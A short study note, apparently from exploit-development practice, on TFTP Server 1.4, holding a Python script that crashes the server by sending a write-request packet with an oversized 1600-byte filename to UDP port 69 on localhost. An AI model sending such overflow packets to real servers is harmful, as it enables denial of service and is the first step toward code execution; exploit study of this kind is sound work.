# TFTP Server 1.4

Downloaded from: https://www.exploit-db.com/apps/f07b073307052ccfb02fe1af243bb229-tftpserverspV1.4.tar.gz

## Initial Crash
```py
import struct
import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 69
target = (TARGET_IP, TARGET_PORT) 

CRASH_LEN = 1600 # change me

payload = b"A" * CRASH_LEN

mode = b"netascii"
packet = b"\x00\x02" + payload + b"\x00" + mode + b"\x00"

s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

s.sendto(packet, (TARGET_IP, TARGET_PORT))
```
